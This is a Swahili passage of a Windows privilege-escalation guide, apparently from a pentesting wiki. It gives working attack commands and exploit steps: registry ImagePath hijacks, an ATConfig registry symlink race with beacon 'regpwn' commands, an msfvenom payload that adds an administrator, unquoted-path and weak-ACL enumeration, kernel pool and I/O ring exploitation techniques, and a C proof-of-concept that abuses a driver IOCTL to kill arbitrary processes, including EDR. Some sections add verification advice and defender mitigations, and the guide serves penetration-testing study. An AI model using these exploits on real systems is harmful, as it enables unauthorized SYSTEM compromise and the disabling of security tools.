Kagua ikiwa **Authenticated Users** au **NT AUTHORITY\INTERACTIVE** wana ruhusa za registry zinazowezesha kuandika kwenye key ya service husika. Entry ya ACL pekee haithibitishi kuwa ufikiaji huo unapatikana: deny entries, token ya sasa na ruhusa zilizorithiwa ni muhimu. Haki za registry key ni tofauti na haki za service object za `SERVICE_CHANGE_CONFIG` na `SERVICE_START`. Escalation pia inahitaji field inayoweza kutumika kwenye configuration ya service, njia ya kuanzisha service, na identity ya service yenye privileges za juu zaidi. Tazama [haki za registry key](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) za Microsoft na [marejeleo ya haki za ufikiaji wa service](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Kubadilisha Path ya binary inayotekelezwa:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Registry symlink race ya kuandika value yoyote ya HKLM (ATConfig)

Baadhi ya vipengele vya Windows Accessibility huunda keys za **ATConfig** kwa kila mtumiaji, ambazo baadaye hunakiliwa na mchakato wa **SYSTEM** kwenye key ya session ya HKLM. **Race** ya registry **symbolic link** inaweza kuelekeza uandishi huo wenye mamlaka ya juu kwenye **path yoyote ya HKLM**, na kutoa uwezo wa msingi wa **kuandika value yoyote ya HKLM**.<sup>[[18]](#references)</sup>

Maeneo muhimu (mfano: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` huorodhesha vipengele vya accessibility vilivyosakinishwa.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` huhifadhi usanidi unaodhibitiwa na mtumiaji.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` huundwa wakati wa kuingia au mabadiliko ya secure desktop, na mtumiaji anaweza kuiandikia.

Mtiririko wa matumizi mabaya (CVE-2026-24291 / ATConfig):

1. Jaza value ya **HKCU ATConfig** unayotaka iandikwe na SYSTEM.
2. Anzisha kunakili kwa secure desktop (kwa mfano, **LockWorkstation**), ambayo huanzisha mtiririko wa AT broker.
3. **Shinda race** kwa kuweka **oplock** kwenye `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; oplock inapotokea, badilisha key ya **HKLM Session ATConfig** iwe **registry link** inayoelekeza kwenye target ya HKLM iliyolindwa.
4. SYSTEM huandika value iliyochaguliwa na mshambuliaji kwenye path ya HKLM iliyoelekezwa.

Ukipata uwezo wa kuandika value yoyote ya HKLM, tumia hilo kupata LPE kwa kubadilisha values za usanidi wa service:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Chagua service ambayo mtumiaji wa kawaida anaweza kuanzisha (kwa mfano, **`msiserver`**) na uianzishe baada ya uandishi. **Kumbuka:** utekelezaji wa exploit ya umma **hufunga workstation** kama sehemu ya race.

Zana za mfano (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Ruhusa za AppendData/AddSubdirectory kwenye registry ya services

Ikiwa una ruhusa hii kwenye registry, inamaanisha **unaweza kuunda sub registries kutoka kwenye hii**. Kwa services za Windows, hii **inatosha kutekeleza code yoyote:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Ikiwa path ya executable haijawekwa ndani ya alama za kunukuu, Windows itajaribu kutekeleza kila sehemu inayoishia kabla ya nafasi.

Kwa mfano, kwa path _C:\Program Files\Some Folder\Service.exe_ Windows itajaribu kutekeleza:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Orodhesha njia zote za huduma zisizowekwa ndani ya alama za kunukuu, ukiondoa zile za huduma za Windows zilizojengewa ndani:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Unaweza kugundua na kutumia** udhaifu huu kwa kutumia metasploit: `exploit/windows/local/trusted\_service\_path` Unaweza kuunda binary ya huduma wewe mwenyewe kwa kutumia metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Vitendo vya Urejeshaji

Windows huruhusu watumiaji kubainisha vitendo vya kutekelezwa huduma inaposhindwa. Kipengele hiki kinaweza kusanidiwa kuelekeza kwenye binary. Ikiwa binary hiyo inaweza kubadilishwa, huenda uwezekano wa kupandisha ruhusa ukawepo. Maelezo zaidi yanapatikana kwenye [nyaraka rasmi](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Malengo ya script ya scheduled task

Kwa task iliyowezeshwa inayoendesha `cmd.exe /c` pamoja na faili ya `.bat` au `.cmd`, kagua script iliyotajwa kwenye **vit argument vya action** pamoja na `cmd.exe`. Hali hiyo hiyo inatumika kwa argument ya faili iliyobainishwa wazi kwa interpreter, kama vile PowerShell `-File`. Ikiwa batch file iliyoratibiwa ina mwito halisi wa PowerShell `-File`, kagua pia ACL ya script iliyorejelewa; vigezo, masharti na uunganishaji wa shell huhitaji ufuatiliaji wa mikono. Script au saraka mama inayoweza kuandikwa na mtumiaji ni kiashiria cha uwezekano wa utekelezaji kati ya akaunti tu ikiwa principal iliyosanidiwa ya task ni tofauti na mtumiaji anayeianzisha, na task inafika kwenye action hiyo. ACL ya append-only inaweza kuwa muhimu kwa scripts, lakini `exit` ya awali au mtiririko mwingine wa udhibiti unaweza kufanya mistari iliyoongezwa isifikiwe. Thibitisha ACL zinazotumika, [muktadha wa utekelezaji wa task](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), saraka ya kufanya kazi, trigger na sera ya udhibiti wa programu kabla ya kudai kuwa kuna uwezekano wa kupandisha ruhusa. Uorodheshaji haupaswi kurekebisha script au kuanzisha task.

## Streams zenye majina kwenye faili zinazofikika

Kwenye NTFS, faili inayoweza kusomwa inaweza kuwa na stream ya `:$DATA` yenye jina, ambayo maudhui yake hayaonyeshwi kwenye orodha ya kawaida ya saraka. Kwa seti ndogo na husika ya backup au faili za usanidi zinazofikika, kagua **majina na ukubwa** wa streams kabla ya kufungua maudhui yoyote; Windows huzionyesha kupitia [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams), na PowerShell kupitia [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Jina la stream linalodokeza kuwa kuna siri ni kiashiria tu. Kagua ruhusa halisi za kusoma faili, ikiwa filesystem inatumia streams, ikiwa stream ina credentials zinazoweza kutumika, na akaunti ambayo credentials hizo huthibitisha utambulisho wake. Epuka kuchanganua streams kwa kujirudia kwenye saraka nzima na kuchapisha maudhui ya streams wakati wa uorodheshaji wa kawaida.

## Ingizo za msaidizi wa Windows Driver Kit zilizoratibiwa

Windows Driver Kit ya hiari inajumuisha `StandaloneRunner.exe`, ambayo inaweza kutumia faili za `command.txt`, `reboot.rsf` na mradi `working\rsf.rsf` kutoka kwenye saraka yake ya uendeshaji. Scheduled task au service inayoanzisha msaidizi huyu kwa kutumia akaunti yenye ruhusa za juu inaweza kufanya ufikiaji wa kuandika wa kiwango cha chini kwenye ingizo hizo uwe njia ya kutekeleza amri katika muktadha wa akaunti hiyo, hata kama executable ya msaidizi yenyewe imelindwa. Thibitisha kuwa mtumiaji mwenye ruhusa za juu ndiye anayezitumia, na kwamba **faili zote mbili** za pembeni zinaweza kuundwa au kurekebishwa; kugundua msaidizi pekee hakutoshi.

Kwa scheduled task, kagua [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) ya action yake na ACL za njia za faili hizo mbili za pembeni. Ikiwa task haibainishi saraka ya kufanya kazi, saraka ya executable ni kiashiria tu cha kuthibitisha, si uthibitisho wa mahali task inaposoma ingizo zake. Sharti la faili ya mradi ya kufanya kazi lazima pia litimizwe. Kagua principal halisi ya task badala ya kudhani kuwa inaendeshwa kama SYSTEM.

## Programu

### Programu Zilizosakinishwa

Kagua **ruhusa za binaries** (huenda ukaweza kubadilisha moja na kupandisha ruhusa) na za **folda** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Njia ya kurekebisha Checkmk Windows agent

[CVE-2024-0670](https://checkmk.com/werk/16361) huathiri matoleo ya zamani ya Checkmk Windows agents yaliyokuwa yanaandika command files katika `C:\Windows\Temp` kisha kutekeleza faili iliyokuwepo awali na iliyokuwa imelindwa dhidi ya uandishi ikiwa uingizwaji ungeshindwa. Vendor alirekebisha tatizo hili katika 2.1.0p40, 2.2.0p23, 2.3.0b1, na 2.4.0b1. Kagua kiwango kamili cha patch kilichosakinishwa na kama operesheni ya agent iliyoathiriwa inaweza kutekelezwa; lebo ya branch pekee kama `2.1` haiwezi kuthibitisha kuwa mfumo umeathirika. Enumeration inaweza kukagua toleo, hali ya service, na ruhusa za Temp bila kuunda faili au kuanzisha agent commands.

#### Ukaguzi wa SAML service ya ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) iliathiri build 6210 na matoleo ya awali ya ADSelfService Plus; vendor aliirekebisha katika build 6211. Inahusika tu ikiwa SAML SSO **imewezeshwa au iliwahi kuwezeshwa**. Kwa hivyo, ingizo la bidhaa iliyosakinishwa au service path ni dalili ya kuchunguza, si uthibitisho wa kuwa na udhaifu: thibitisha build husika, historia ya usanidi wa SAML, ufikikaji wa service kupitia mtandao, na akaunti inayoendesha service hiyo. Code execution kupitia service hurithi ruhusa za akaunti hiyo; utekelezaji wa SYSTEM unahitaji instance inayoendeshwa kama SYSTEM. Faili ya `OfflineBackup_*.ezip` inayosomeka katika Backup directory ya bidhaa ni dalili tofauti ya backup iliyosimbwa kwa njia fiche, si ushahidi wa credential inayoweza kutumika au wa udhaifu huu wa SAML. Rekodi njia yake na ruhusa za ufikiaji bila kuifungua wakati wa enumeration ya kawaida.

#### Jenkins controller na mipaka ya akaunti za domain

Kwenye Windows Jenkins controller, tofautisha ruhusa ya kuunda au kusanidi job na ruhusa ya kuianzisha: [Jenkins inaeleza kuwa hizi ni ruhusa tofauti za `Job/Create`, `Job/Configure`, na `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Ratiba iliyosanidiwa au remote trigger inaweza kutoa njia nyingine ya kuanzisha build, lakini thibitisha kuwa imewezeshwa na build inaendeshwa kweli. Utekelezaji hutumia utambulisho wa controller au agent iliyochaguliwa, na credential iliyohifadhiwa inaweza kutumiwa tu ikiwa job inaweza kufikia scope yake. Kando na hilo, kagua ufikiaji wa metadata za `JENKINS_HOME`: Jenkins huhifadhi credential material na encryption keys katika `credentials.xml`, `secrets/hudson.util.Secret`, na `secrets/master.key` ([hifadhi ya siri za Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). Kuwepo kwa faili hizi pekee hakufichui password; thibitisha **ruhusa ya kusoma faili zinazohitajika** na njia tofauti ya kutumia tena akaunti bila kuchapisha siri katika matokeo yanayoshirikiwa. Ikiwa akaunti hiyo ina ruhusa ya kuandika `scriptPath` ya AD user-object, thibitisha kuwa script path inaweza kuandikika na kuna logon halisi au consumer iliyoratibiwa inayoendeshwa kama mtumiaji lengwa kabla ya kuichukulia kama utekelezaji kati ya watumiaji. Udhibiti zaidi wa group unahitaji haki halisi za AD zilizothibitishwa kando.

#### Utambulisho wa Azure Pipelines self-hosted agent

Kwa mradi wa Azure DevOps Server au Azure Pipelines, tofautisha ruhusa ya **kuunda au kuhariri** pipeline na ruhusa ya **kuipanga iendeshwe** na kutumia agent pool iliyochaguliwa; [Microsoft inaeleza ruhusa za pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) na [idhini ya pool](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) kando. Ikiwa akaunti yenye ruhusa za chini inaweza kuwasilisha hatua ya script na kuendesha pipeline hiyo kwenye Windows agent inayojisimamia, hatua hiyo hutekelezwa kama [akaunti ya mfumo wa uendeshaji iliyosanidiwa kwa agent](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Thibitisha pipeline husika, vizuizi vya branch/resource, pool iliyoidhinishwa, job inayoweza kuendeshwa, na utambulisho wa agent service kabla ya kudai kuwa kuna mpito kati ya watumiaji au kwenda SYSTEM. Agent iliyosakinishwa, role ya mradi, au ruhusa ya kuandika kwenye repository pekee ni dalili tu; kagua ruhusa na metadata ya local service bila kuanzisha build wakati wa passive enumeration.

#### Credentials za Microsoft Entra Connect Sync

[Microsoft hutofautisha](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **ADSync service account**, inayoendesha synchronization service na kufikia SQL database yake, na **AD DS connector account**, ambayo ruhusa zake za directory hutegemea vipengele vya sync vilivyosaniwa. Credentials za connector huhifadhiwa zikiwa zimesimbwa kwa njia fiche katika database hiyo, huku key material [ikilindwa na DPAPI chini ya ADSync service account](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Sync service iliyosakinishwa, group ya local administrator inayoonekana kuwa na ruhusa, au kuona database pekee hakuthibitishi kuwa kuna credential inayoweza kufumbuliwa au kupandisha ruhusa katika domain. Kagua kivyake ruhusa halisi za kusoma database, ufikiaji wa service account/key, mpangilio wa usakinishaji na SQL, utambulisho wa connector uliosanidiwa, na ruhusa halisi za utambulisho huo katika AD. Enumeration ya kawaida inapaswa kuonyesha metadata ya service na ufikiaji pekee, si kuuliza au kuchapisha siri zilizohifadhiwa.

#### Ruhusa za Printer driver support DLL

Printer driver iliyosakinishwa inaweza kuhifadhi support DLLs katika `C:\ProgramData` na kuzipakia ndani ya print process yenye ruhusa za juu zaidi. Kagua directory halisi ya driver na ACL za DLL, pamoja na parent directories na reparse points, hata kama enumeration ya printer kupitia WMI imekataliwa. Kwa [tatizo la Ricoh printer-driver CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), njia iliyoripotiwa ilikuwa `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [ufichuzi wa awali](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) unaeleza kupakiwa kwa DLL na `PrintIsolationHost.exe`. ACL inayoruhusu uandishi ni dalili tu: thibitisha ruhusa halisi ya kuandika baada ya kuzingatia deny entries, kuwa driver husika imesakinishwa na hupakia faili hiyo ikiwa na utambulisho wenye ruhusa za juu, na kama driver iliyosasishwa ya vendor au security program imerekebisha usakinishaji huo. Usihitimishe kuwa kuna udhaifu kutokana na jina la directory au toleo la driver pekee.

### Ruhusa za Kuandika

Angalia kama unaweza kurekebisha config file ili kusoma faili maalum au kama unaweza kurekebisha binary itakayoendeshwa na akaunti ya Administrator (schedtasks).

Njia mojawapo ya kutafuta ruhusa dhaifu za folder/files katika mfumo ni kufanya hivi:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Persistence/utekelezaji kupitia plugin autoload ya Notepad++

Notepad++ hupakia kiotomatiki DLL yoyote ya plugin iliyo ndani ya folda zake ndogo za `plugins`. Ikiwa kuna usakinishaji unaoweza kuandikika wa portable/nakala, kuweka plugin hasidi husababisha code execution kiotomatiki ndani ya `notepad++.exe` kila inapozinduliwa (ikiwemo kupitia `DllMain` na callbacks za plugin).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Endesha wakati wa kuwasha

**Angalia kama unaweza kubadilisha registry au binary ambayo itatekelezwa na mtumiaji mwingine.**\
**Soma** **ukurasa ufuatao** ili ujifunze zaidi kuhusu **maeneo ya autoruns yanayoweza kutumika kuongeza privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Tafuta drivers zinazoweza kuwa za **third-party zisizo za kawaida/zilizo hatarishi**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Ikiwa driver inafichua primitive ya kusoma/kuandika kernel kiholela (jambo la kawaida katika IOCTL handlers zilizoundwa vibaya), unaweza kupata privilege escalation kwa kuiba token ya SYSTEM moja kwa moja kutoka kwenye kernel memory.<sup>[[13]](#references)</sup> Tazama mbinu ya hatua kwa hatua hapa:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Kwa race-condition bugs ambapo call iliyo hatarini hufungua njia ya Object Manager inayodhibitiwa na mshambuliaji, kuchelewesha makusudi lookup (kwa kutumia components zenye urefu wa juu au minyororo mirefu ya directories) kunaweza kuongeza muda wa fursa kutoka microseconds hadi makumi ya microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Cancel-safe queue UAFs, paged-pool disclosures, na I/O ring pivots

Baadhi ya Windows kernel LPE chains zinaweza kujengwa kutokana na bugs mbili ambazo kila moja ni dhaifu: **cancel-safe queue lifetime race** inayofuta request/CBD huku queue lock ikiwa bado imeshikiliwa, na disclosure ya **lock-release-before-copy** inayovujisha paged-pool allocation iliyofutwa wakati wa `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Vidokezo vya ukaguzi na exploitation:

- **Kufuta chini ya lock + cancel baadaye**: tafuta success path inayofanya **Acquire -> CompleteRequest/free -> Release**, huku cancel path ikifanya **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Ikiwa success path itafikia `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` kabla ya kuachia CBDQ/CSQ lock, thread iliyozuiwa ndani ya `NtCancelIoFileEx -> IopCsqCancelRoutine` inaweza kuendelea baadaye na kupitisha `PFLT_CALLBACK_DATA` iliyofutwa kwa callback ya remove ya driver.
- **Reclaim queue object iliyofutwa** kwa paged-pool allocation ya ukubwa sawa, inayodhibitiwa na mshambuliaji. `NPFS` Data Queue Entries ni muhimu kwa sababu payload na ukubwa wake vinaweza kudhibitiwa na baadaye unaweza kuvichunguza kwa pipe read/peek operations. Ikiwa object iliyofutwa ina list links, ziandike upya kwa **cyclic list ya fake request nodes kwenye user memory** ili driver iendelee kuchakata request structures zilizobainishwa na mshambuliaji badala ya kusimama kwenye list head ya awali.
- **Boresha write inayotabirika**: ikiwa fake request itaelekeza upya nested context pointer inayotumiwa na bookkeeping writes (timestamps / QPC / sehemu zilizo karibu na refcount), unaweza kupata kernel write inayodhibitiwa kwa anwani lakini si kwa thamani. Katika hali hiyo, lenga field ya **length/size** ya sprayed pool object badala ya code/data pointer ya mwisho, kisha kagua spray hadi object iliyoharibiwa iwezeshe **out-of-bounds paged-pool read**.
- **Muundo wa disclosure unaoweza kushambuliwa kwa race**: syscall yoyote inayofanya `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` ni candidate nzuri. Utegemevu huboreka mshambuliaji anapoweza kuongeza ukubwa wa buffer inayokopiwa (kwa mfano, kwa kuongeza entries nyingi za list/resource zinazoongeza ukubwa wa mwisho wa allocation ya serializer), kwa sababu copy ndefu zaidi huongeza muda wa kubadilisha buffer bila lazima kusababisha machine ku-crash.
- **Malengo ya refill yenye pointers nyingi**: arrays za registered-buffer za Windows **I/O ring** ni malengo bora ya disclosure kwa sababu ukubwa wake wa paged-pool unadhibitiwa na mshambuliaji (`8 * regBufferCnt`) na kila element ni kernel pointer inayoelekeza kwenye `_IOP_MC_BUFFER_ENTRY`. Vujiisha moja ya arrays hizi, pata `IORING_OBJECT` inayozizunguka, kisha haribu **`RegBuffers`** na **`RegBuffersCount`** ili shughuli zinazofuata za I/O ring zitumie entries zilizoghushiwa na mshambuliaji na kutoa kernel read/write kiholela. Ikiwa write pekee inayopatikana inakupa byte thabiti (kwa mfano kutoka `KUSER_SHARED_DATA+0x14`), tumia **overlapping unaligned writes** kujenga user pointer yenye byte ileile inayojirudia kama `0x0101010101010101`, i-map kwa `VirtualAlloc`, kisha weka registered-buffer array iliyoghushiwa hapo.<sup>[[30]](#references)</sup>

Viashiria muhimu vya debugging:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Baada ya kupata arbitrary kernel read/write kutoka kwa I/O ring iliyoharibika, iba token ya SYSTEM kwa kutumia workflow ya kawaida ya post-primitive:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitives za memory corruption kwenye Registry hive

Vulnerabilities za kisasa za hive hukuwezesha kugroom layouts deterministik, kutumia vibaya descendants za HKLM/HKU zinazoweza kuandikwa, na kubadilisha metadata corruption kuwa kernel paged-pool overflows bila driver maalum. Jifunze chain nzima hapa:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Type confusion ya direct-mode ya `RtlQueryRegistryValues` kupitia paths zinazodhibitiwa na mshambuliaji

Baadhi ya drivers hupokea path ya registry kutoka userland, huthibitisha tu kwamba ni UTF-16 string halali, kisha huita `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` kwa `RTL_QUERY_REGISTRY_DIRECT` kwenye scalar ya stack kama `int readValue`. Ikiwa `RTL_QUERY_REGISTRY_TYPECHECK` haipo, `EntryContext` hutafsiriwa kulingana na aina **halisi** ya registry, si aina aliyotarajia developer.

Hii hutengeneza primitives mbili zenye manufaa:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: path ya `\Registry\...` inayodhibitiwa na mtumiaji huiruhusu driver kuuliza keys zilizochaguliwa na mshambuliaji, kufichua kama zipo kupitia return codes/logs, na wakati mwingine kusoma values ambazo caller hangeweza kufikia moja kwa moja.
- **Kernel memory corruption**: destination ya scalar kama `&readValue` huchanganyikiwa aina na kuwa `REG_QWORD`, `UNICODE_STRING`, au buffer ya binary yenye ukubwa maalum, kulingana na aina ya registry value.

Vidokezo vya practical exploitation:

- **Mitigation ya Windows 8+**: ikiwa query itagusa **untrusted hive** kwa kutumia `RTL_QUERY_REGISTRY_DIRECT` bila `RTL_QUERY_REGISTRY_TYPECHECK`, kernel callers hu-crash kwa `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Ili exploitability iendelee, tafuta **keys zinazoweza kuandikwa na mshambuliaji ndani ya trusted system hives** badala ya kuweka values chini ya `HKCU`.
- **Uwekaji wa values kwenye trusted hive**: tumia NtObjectManager kuorodhesha descendants za `\Registry\Machine` zinazoweza kuandikwa, kisha rudia scan hiyo kwa token ya **low-integrity** iliyorudiwa ili kupata keys zinazoweza kufikiwa kutoka kwenye mazingira ya sandbox:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: uandishi wa moja kwa moja wa baiti 8 kwenye `int` ya baiti 4 huharibu data iliyo karibu kwenye stack na unaweza kufunika kwa sehemu pointer ya callback/function iliyo karibu.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode inatarajia `EntryContext` ielekeze kwenye `UNICODE_STRING`. Ikiwa code itapakia kwanza `REG_DWORD` inayodhibitiwa na mshambulizi kwenye scalar ya stack kisha itumie tena buffer hiyo hiyo kwa usomaji wa string, mshambulizi hudhibiti `Length`/`MaximumLength` na huathiri kwa sehemu pointer ya `Buffer`, hivyo kusababisha uandishi wa kernel unaodhibitika kwa kiasi.
- **`REG_BINARY`**: kwa data kubwa ya binary, direct mode huchukulia `LONG` ya kwanza kwenye `EntryContext` kuwa ukubwa wa buffer wenye alama. Ikiwa usomaji wa awali wa `REG_DWORD` utaacha thamani **hasi** inayodhibitiwa na mshambulizi kwenye scalar inayotumiwa tena, swali linalofuata la `REG_BINARY` hunakili baiti za mshambulizi moja kwa moja juu ya nafasi za stack zilizo karibu. Hii mara nyingi ndiyo njia rahisi zaidi ya kufunika pointer ya callback kikamilifu.

Muundo mzuri wa kutafuta: **usomaji wa registry wa aina tofauti kwenye variable ileile ya stack bila kuianzisha upya**. Tafuta `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, pointer za `EntryContext` zinazotumiwa tena, na njia za code ambapo usomaji wa kwanza wa registry hudhibiti iwapo usomaji wa pili utafanyika.

#### Kutumia kukosekana kwa FILE_DEVICE_SECURE_OPEN kwenye device objects (LPE + EDR kill)

Baadhi ya drivers za wahusika wengine zilizosainiwa huunda device object yao kwa SDDL imara kupitia IoCreateDeviceSecure lakini husahau kuweka FILE_DEVICE_SECURE_OPEN kwenye DeviceCharacteristics. Bila flag hii, DACL salama haitatekelezwa device inapofunguliwa kupitia path iliyo na kipengele cha ziada. Hii humwezesha mtumiaji yeyote asiye na haki maalum kupata handle kwa kutumia path ya namespace kama:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (kutoka kwenye kisa halisi)

Mtumiaji akishaweza kufungua device, IOCTL zenye mamlaka ya juu zinazotolewa na driver zinaweza kutumiwa vibaya kwa LPE na hujuma. Uwezo ulioonekana katika matukio halisi:
- Kurudisha handles zenye ufikiaji kamili kwa processes zisizobainishwa (wizi wa token / shell ya SYSTEM kupitia DuplicateTokenEx/CreateProcessAsUser).
- Kusoma/kuandika bila vizuizi kwenye diski ghafi (kuhujumu mfumo ukiwa offline, hila za persistence wakati wa boot).
- Kusitisha processes zisizobainishwa, zikiwemo Protected Process/Light (PP/PPL), hivyo kuruhusu kuua AV/EDR kutoka user land kupitia kernel.

Muundo wa chini kabisa wa PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Hatua za kupunguza hatari kwa watengenezaji
- Weka FILE_DEVICE_SECURE_OPEN kila wakati unapounda device objects zinazokusudiwa kuzuiwa kwa DACL.
- Thibitisha muktadha wa caller kwa shughuli zenye upendeleo. Ongeza ukaguzi wa PP/PPL kabla ya kuruhusu kusitishwa kwa process au urejeshaji wa handles.
- Weka vikwazo kwa IOCTLs (access masks, METHOD_*, uthibitishaji wa input) na uzingatie miundo ya broker badala ya kutumia moja kwa moja kernel privileges.

Mawazo ya detection kwa watetezi
- Fuatilia ufunguaji wa device names zinazotiliwa shaka kutoka user-mode (k.m., \\ .\\amsdk*) na mfuatano mahususi wa IOCTL unaoashiria matumizi mabaya.
- Tekeleza Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) na udumishe allow/deny lists zako.


## PATH DLL Hijacking

